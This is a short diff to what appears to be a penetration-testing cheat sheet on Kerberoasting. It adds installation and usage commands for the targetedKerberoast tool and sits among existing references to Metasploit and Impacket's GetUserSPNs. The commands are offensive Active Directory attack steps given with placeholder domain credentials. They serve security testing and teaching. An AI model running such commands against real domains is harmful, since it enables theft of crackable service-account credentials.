@@ -94,6 +94,24 @@ Transfer the executable into a WIndows target and run it:
 msf> use auxiliary/gather/get_user_spns
 ```
 
+
+
+### targetedKerberoast
+
+{% embed url="https://github.com/ShutdownRepo/targetedKerberoast" %}
+
+{% code title="Installation" %}
+```bash
+git clone https://github.com/ShutdownRepo/targetedKerberoast
+```
+{% endcode %}
+
+{% code title="Usage" %}
+```bash
+targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
+```
+{% endcode %}
+
 ### GetUserSPNs.py (Linux)
 
 The Impacket script **GetUserSPNs (Python)** can perform all the necessary steps to request a ST for a service given its SPN and valid domain credentials.
